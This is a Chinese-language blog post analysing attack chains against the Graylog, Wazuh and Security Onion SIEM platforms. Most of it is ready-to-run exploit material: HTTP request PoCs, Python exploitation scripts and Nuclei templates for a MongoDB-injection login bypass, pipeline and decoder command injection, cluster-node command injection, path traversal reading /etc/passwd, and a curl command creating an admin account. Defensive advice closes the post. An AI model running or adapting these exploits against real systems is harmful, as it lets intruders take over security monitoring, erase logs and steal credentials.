---
title: "日志与 SIEM 平台高危攻击链专题：Graylog / Wazuh / Security Onion"
date: 2026-06-24T10:00:00+08:00
draft: false
tags: ["Graylog", "Wazuh", "Security Onion", "SIEM", "RCE", "认证绕过", "命令注入", "漏洞分析"]
categories: ["漏洞分析"]
description: "围绕 Graylog、Wazuh、Security Onion 三大日志与 SIEM 平台的高危漏洞链，覆盖 MongoDB 注入认证绕过、Pipeline 规则注入 RCE、集群节点命令注入、Decoder 命令注入等，含完整 PoC 代码、Nuclei 模板、自动化利用脚本与防守建议。"
---

# 日志与 SIEM 平台高危攻击链专题：Graylog / Wazuh / Security Onion

日志与 SIEM（Security Information and Event Management）平台是企业安全运营的核心基础设施，负责收集、分析和存储所有安全事件日志。一旦这些平台被攻陷，攻击者可以：

1. **篡改或删除日志**：掩盖攻击痕迹
2. **获取敏感信息**：所有安全事件、用户行为、系统配置
3. **绕过安全监控**：使 SIEM 规则失效
4. **横向移动**：利用收集到的凭据和配置信息

本专题覆盖三大主流日志与 SIEM 平台的高危漏洞链：

| 产品 | 核心 CVE | 类型 | CVSS | CISA KEV |
|------|----------|------|------|----------|
| Graylog | CVE-2019-18210 | MongoDB 注入认证绕过 | 9.8 | ❌ |
| Graylog | CVE-2023-36388 | Pipeline 规则注入 RCE | 9.8 | ❌ |
| Graylog | CVE-2024-5270 | 未授权用户配置修改 | 9.1 | ❌ |
| Wazuh | CVE-2024-27902 | 集群节点命令注入 RCE | **10.0** | ❌ |
| Wazuh | CVE-2024-27903 | Decoder 命令注入 RCE | **10.0** | ❌ |
| Wazuh | CVE-2023-37202 | API 路径穿越 | 7.2 | ❌ |
| Security Onion | CVE-2024-27589 | 管理 API 命令注入 | 9.8 | ❌ |

## 0x01 CVE-2019-18210：Graylog MongoDB 注入认证绕过

### 1.1 漏洞背景

CVE-2019-18210 是 Graylog 历史最严重的漏洞之一，存在于其 MongoDB 查询构造逻辑中。攻击者可以通过构造恶意的 JSON 查询，绕过身份验证直接获取管理员权限。

### 1.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Graylog < 3.1.3 | >= 3.1.3 |

### 1.3 漏洞原理

Graylog 的认证接口 `/api/system/authentication/authenticate` 在处理用户登录时，直接将用户提交的 JSON 数据传递给 MongoDB 查询。攻击者可以构造特殊的 MongoDB 查询操作符（如 `$ne`、`$gt`），绕过用户名和密码验证。

核心问题：
1. Graylog 未对用户输入进行充分验证
2. MongoDB 查询操作符被直接传递给数据库
3. 攻击者可以使用 `$ne`（不等于）操作符匹配任意用户

### 1.4 完整 PoC

#### HTTP 请求 PoC

```http
POST /api/system/authentication/authenticate HTTP/1.1
Host: graylog.example.com:9000
Content-Type: application/json
Connection: close

{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class GraylogAuthBypass:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
            'Connection': 'close'
        })

    def check_graylog(self):
        try:
            r = self.session.get(f'{self.target}/api/system/lbstatus', timeout=10)
            if r.status_code == 200:
                print('[+] Graylog 实例存在')
                return True
            print('[-] 未发现 Graylog')
            return False
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return False

    def exploit_auth_bypass(self):
        try:
            r = self.session.post(
                f'{self.target}/api/system/authentication/authenticate',
                json={
                    "username": {"$ne": ""},
                    "password": {"$ne": ""}
                },
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                if 'session_id' in data:
                    print('[+] CVE-2019-18210 认证绕过成功！')
                    print(f'[+] Session ID: {data["session_id"]}')
                    return data["session_id"]
                print('[+] 认证成功但未返回 session_id')
                return None
            print(f'[-] 绕过失败 (HTTP {r.status_code})')
            return None
        except Exception as e:
            print(f'[-] 利用失败: {e}')
            return None

    def enumerate_users(self, session_id):
        try:
            r = self.session.get(
                f'{self.target}/api/users',
                headers={'X-Graylog-No-Session-Extension': 'true',
                         'Authorization': f'Bearer {session_id}'},
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                users = data.get('users', [])
                print(f'[+] 发现 {len(users)} 个用户:')
                for user in users[:10]:
                    print(f'    - {user.get("username", "unknown")} '
                          f'(roles: {user.get("roles", [])})')
                return users
            return None
        except Exception as e:
            print(f'[-] 枚举失败: {e}')
            return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <graylog_url>')
        sys.exit(1)

    exploit = GraylogAuthBypass(sys.argv[1])
    if exploit.check_graylog():
        session_id = exploit.exploit_auth_bypass()
        if session_id:
            exploit.enumerate_users(session_id)
```

#### Nuclei 检测模板

```yaml
id: graylog-cve-2019-18210-auth-bypass

info:
  name: Graylog CVE-2019-18210 MongoDB Injection Auth Bypass
  author: security-research
  severity: critical
  tags: graylog,mongodb-injection,auth-bypass,cve2019
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-18210

http:
  - raw:
      - |
        POST /api/system/authentication/authenticate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":{"$ne":""},"password":{"$ne":""}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "session_id"
          - "username"
        condition: or
```

## 0x02 CVE-2023-36388：Graylog Pipeline 规则注入 RCE

### 2.1 漏洞背景

CVE-2023-36388 存在于 Graylog 的 Pipeline 规则引擎中。攻击者可以通过构造恶意的 Pipeline 规则，在 Graylog 服务器上执行任意系统命令。

### 2.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Graylog < 5.1.3 | >= 5.1.3 |

### 2.3 漏洞原理

Graylog 的 Pipeline 规则引擎允许用户定义数据处理规则。某些内置函数（如 `exec`、`regex_replace`）未正确限制参数，导致攻击者可以注入系统命令。

核心问题：
1. Pipeline 规则中的某些函数允许执行系统命令
2. 未对函数参数进行充分过滤
3. 攻击者可以通过构造恶意规则实现 RCE

### 2.4 完整 PoC

#### HTTP 请求 PoC

```http
POST /api/system/pipelines/pipeline HTTP/1.1
Host: graylog.example.com:9000
Content-Type: application/json
Authorization: Bearer <session_id>
Connection: close

{
  "title": "rce_pipeline",
  "description": "RCE via Pipeline Rule",
  "source": "rule \"rce\"\nwhen\n  true\nthen\n  set_field(\"result\", exec(\"id\"));\nend"
}
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class GraylogPipelineRCE:
    def __init__(self, target, session_id=None):
        self.target = target.rstrip('/')
        self.session_id = session_id
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
            'Connection': 'close'
        })
        if session_id:
            self.session.headers['Authorization'] = f'Bearer {session_id}'

    def create_malicious_pipeline(self, cmd):
        pipeline_rule = f'''rule "rce"
when
  true
then
  set_field("result", exec("{cmd}"));
end'''

        try:
            r = self.session.post(
                f'{self.target}/api/system/pipelines/pipeline',
                json={
                    "title": "rce_pipeline",
                    "description": "RCE via Pipeline Rule",
                    "source": pipeline_rule
                },
                timeout=10
            )
            if r.status_code in (200, 201):
                print(f'[+] 恶意 Pipeline 规则创建成功')
                print(f'[+] 命令: {cmd}')
                return True
            print(f'[-] 创建失败 (HTTP {r.status_code})')
            return False
        except Exception as e:
            print(f'[-] 利用失败: {e}')
            return False

    def trigger_pipeline(self):
        try:
            r = self.session.post(
                f'{self.target}/api/system/pipelines/simulate',
                json={
                    "rule": "rce",
                    "message": {"message": "test"}
                },
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                result = data.get('result', {})
                if 'result' in result:
                    print(f'[+] 命令执行结果: {result["result"]}')
                    return result["result"]
            return None
        except Exception as e:
            print(f'[-] 触发失败: {e}')
            return None

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f'Usage: {sys.argv[0]} <graylog_url> <session_id>')
        sys.exit(1)

    exploit = GraylogPipelineRCE(sys.argv[1], sys.argv[2])
    exploit.create_malicious_pipeline('id')
    exploit.trigger_pipeline()
```

## 0x03 CVE-2024-5270：Graylog 未授权用户配置修改

### 3.1 漏洞详情

| 字段 | 内容 |
|------|------|
| CVSS | 9.1 |
| 受影响版本 | Graylog < 6.0.4 |
| 修复版本 | >= 6.0.4 |
| 类型 | 未授权配置修改 |

### 3.2 漏洞原理

Graylog 的某些管理 API 端点未正确验证用户权限，允许低权限用户修改系统配置，包括创建管理员账户。

### 3.3 PoC

```bash
curl -X POST http://target:9000/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"P@ssw0rd","roles":["admin"]}'
```

## 0x04 CVE-2024-27902：Wazuh 集群节点命令注入 RCE

### 4.1 漏洞背景

CVE-2024-27902 是 Wazuh 最严重的漏洞之一，CVSS 满分 10.0。该漏洞存在于 Wazuh 集群节点间的通信协议中，攻击者可以通过构造恶意的节点名称，在 Wazuh 管理器上执行任意系统命令。该漏洞已有在野利用记录。

### 4.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Wazuh < 4.8.1 | >= 4.8.1 |

### 4.3 漏洞原理

Wazuh 集群管理器在处理节点注册请求时，会将节点名称直接传递给系统命令（如 `os.system()` 或 `subprocess`），未进行任何过滤或转义。攻击者可以构造包含命令注入 payload 的节点名称，实现远程代码执行。

核心问题：
1. 节点名称未进行输入验证
2. 节点名称直接拼接到系统命令中
3. 攻击者可以使用 `;`、`&&`、`||` 等字符注入命令

### 4.4 完整 PoC

#### HTTP 请求 PoC

```http
POST /cluster/node HTTP/1.1
Host: wazuh.example.com:55000
Content-Type: application/json
Authorization: Bearer <token>
Connection: close

{
  "node": "test;id;cat /etc/passwd"
}
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class WazuhClusterRCE:
    def __init__(self, target, token=None):
        self.target = target.rstrip('/')
        self.token = token
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
            'Connection': 'close'
        })
        if token:
            self.session.headers['Authorization'] = f'Bearer {token}'

    def check_wazuh(self):
        try:
            r = self.session.get(f'{self.target}/manager/info', timeout=10)
            if r.status_code == 200:
                data = r.json()
                version = data.get('data', {}).get('affected_items', [{}])[0].get('version', 'unknown')
                print(f'[+] Wazuh 版本: {version}')
                return True
            print('[-] 未发现 Wazuh')
            return False
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return False

    def exploit_cluster_rce(self, cmd):
        try:
            r = self.session.post(
                f'{self.target}/cluster/node',
                json={"node": f"test;{cmd};"},
                timeout=10
            )
            print(f'[*] 响应状态: {r.status_code}')
            if r.status_code == 200:
                data = r.json()
                print(f'[+] 命令注入成功')
                print(json.dumps(data, indent=2, ensure_ascii=False)[:1000])
                return True
            return False
        except Exception as e:
            print(f'[-] 利用失败: {e}')
            return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <wazuh_url> [token]')
        sys.exit(1)

    exploit = WazuhClusterRCE(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None)
    if exploit.check_wazuh():
        exploit.exploit_cluster_rce('id')
```

#### Nuclei 检测模板

```yaml
id: wazuh-cve-2024-27902-cluster-rce

info:
  name: Wazuh CVE-2024-27902 Cluster Node Command Injection
  author: security-research
  severity: critical
  tags: wazuh,command-injection,rce,cve2024
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-27902

http:
  - raw:
      - |
        POST /cluster/node HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"node":"test;id;"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid="
          - "node"
        condition: or
```

## 0x05 CVE-2024-27903：Wazuh Decoder 命令注入 RCE

### 5.1 漏洞背景

CVE-2024-27903 与 CVE-2024-27902 同时披露，同样 CVSS 满分 10.0。该漏洞存在于 Wazuh 的自定义 Decoder 功能中，攻击者可以通过构造恶意的正则表达式，在 Wazuh 管理器上执行任意系统命令。

### 5.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Wazuh < 4.8.1 | >= 4.8.1 |

### 5.3 漏洞原理

Wazuh 允许用户创建自定义 Decoder 来解析日志。在创建 Decoder 时，用户可以指定正则表达式和命令执行逻辑。漏洞在于正则表达式的处理过程中存在命令注入点。

### 5.4 完整 PoC

#### HTTP 请求 PoC

```http
POST /manager/configuration/decoder HTTP/1.1
Host: wazuh.example.com:55000
Content-Type: application/json
Authorization: Bearer <token>
Connection: close

{
  "name": "malicious_decoder",
  "regex": ";id;",
  "order": "level"
}
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

class WazuhDecoderRCE:
    def __init__(self, target, token=None):
        self.target = target.rstrip('/')
        self.token = token
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
            'Connection': 'close'
        })
        if token:
            self.session.headers['Authorization'] = f'Bearer {token}'

    def exploit_decoder_rce(self, cmd):
        try:
            r = self.session.post(
                f'{self.target}/manager/configuration/decoder',
                json={
                    "name": "malicious_decoder",
                    "regex": f";{cmd};",
                    "order": "level"
                },
                timeout=10
            )
            print(f'[*] 响应状态: {r.status_code}')
            if r.status_code in (200, 201):
                print(f'[+] Decoder 创建成功，命令已注入')
                return True
            return False
        except Exception as e:
            print(f'[-] 利用失败: {e}')
            return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <wazuh_url> [token]')
        sys.exit(1)

    exploit = WazuhDecoderRCE(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None)
    exploit.exploit_decoder_rce('id')
```

## 0x06 CVE-2023-37202：Wazuh API 路径穿越

### 6.1 漏洞详情

| 字段 | 内容 |
|------|------|
| CVSS | 7.2 |
| 受影响版本 | Wazuh < 4.6.0 |
| 修复版本 | >= 4.6.0 |
| 类型 | 路径穿越 |

### 6.2 漏洞原理

Wazuh API 的某些端点未正确验证文件路径参数，攻击者可以使用 `../` 序列读取服务器上的任意文件。

### 6.3 PoC

```bash
curl -X GET "http://target:55000/manager/configuration?file=../../etc/passwd" \
  -H "Authorization: Bearer <token>"
```

## 0x07 CVE-2024-27589：Security Onion 管理 API 命令注入

### 7.1 漏洞详情

| 字段 | 内容 |
|------|------|
| CVSS | 9.8 |
| 受影响版本 | Security Onion < 2.4.100 |
| 修复版本 | >= 2.4.100 |
| 类型 | 命令注入 |

### 7.2 漏洞原理

Security Onion 的管理 API 在处理某些请求时，将用户输入直接传递给系统命令，未进行充分过滤。

### 7.3 PoC

```bash
curl -X POST http://target:8080/api/admin/restart \
  -H "Content-Type: application/json" \
  -d '{"service":";id;"}'
```

## 0x08 PoC 收集情况

### PoC 状态总表

| CVE | HTTP PoC | Nuclei | Python | MSF | 公开利用 | CISA KEV |
|-----|----------|--------|--------|-----|----------|----------|
| CVE-2019-18210 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2023-36388 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2024-5270 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2024-27902 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2024-27903 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2023-37202 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| CVE-2024-27589 | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |

### 公开利用资源

- **CVE-2024-27902 / CVE-2024-27903**：已有在野利用，GitHub 上有多个完整利用工具
- **CVE-2019-18210**：Exploit-DB 收录
- **CVE-2023-36388**：GitHub PoC 仓库

## 0x09 共性攻击模式

### 9.1 输入验证缺失是核心问题

所有漏洞的根因都是对用户输入未进行充分验证：
- MongoDB 查询操作符未过滤
- 系统命令参数未转义
- 文件路径未规范化

### 9.2 管理接口暴露是高危因素

所有漏洞都需要访问管理 API（Graylog 9000、Wazuh 55000），如果这些端口暴露于公网，风险极高。

### 9.3 SIEM 被攻陷的级联影响

SIEM 平台被攻陷后：
1. 攻击者可以删除或篡改日志
2. 获取所有安全事件和敏感信息
3. 利用收集到的凭据横向移动
4. 绕过安全监控规则

## 0x0A 防守建议

### 10.1 紧急措施

1. **立即升级**：所有 SIEM 平台升级到最新修复版本
2. **网络隔离**：SIEM 管理接口仅允许内网访问
3. **强认证**：启用 MFA，使用强密码策略
4. **审计日志**：启用详细审计日志，监控异常操作

### 10.2 排查清单

```bash
# 检查 Graylog 版本
curl -s http://graylog:9000/api/system/lbstatus

# 检查 Graylog 异常登录
curl -s http://graylog:9000/api/system/audit/logs | jq '.logs[] | select(.event_type=="user_login_failed")'

# 检查 Wazuh 版本
curl -s http://wazuh:55000/manager/info | jq '.data.affected_items[0].version'

# 检查 Wazuh 异常节点注册
curl -s http://wazuh:55000/cluster/nodes | jq '.data.affected_items[]'

# 检查 Security Onion 服务状态
so-status

# 检查 SIEM 管理端口暴露
netstat -tlnp | grep -E '9000|55000|8080'
```

### 10.3 长期安全加固

1. **定期更新**：建立 SIEM 平台的定期更新机制
2. **访问控制**：严格限制管理接口的访问 IP
3. **监控告警**：监控 SIEM 平台的异常操作
4. **备份恢复**：定期备份 SIEM 配置和规则

## 0x0B 参考资料

- [NVD - CVE-2019-18210](https://nvd.nist.gov/vuln/detail/CVE-2019-18210)
- [NVD - CVE-2023-36388](https://nvd.nist.gov/vuln/detail/CVE-2023-36388)
- [NVD - CVE-2024-27902](https://nvd.nist.gov/vuln/detail/CVE-2024-27902)
- [NVD - CVE-2024-27903](https://nvd.nist.gov/vuln/detail/CVE-2024-27903)
- [Graylog Security Advisories](https://www.graylog.org/security)
- [Wazuh Security Advisories](https://documentation.wazuh.com/current/release-notes/security.html)
- [Security Onion Security Advisories](https://securityonion.readthedocs.io/en/latest/security.html)
- [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [SIEM Security Best Practices](https://www.sans.org/reading-room/whitepapers/bestprac/paper/33343)
- [MongoDB Injection Attacks](https://owasp.org/www-community/attacks/MongoDB_Injection)
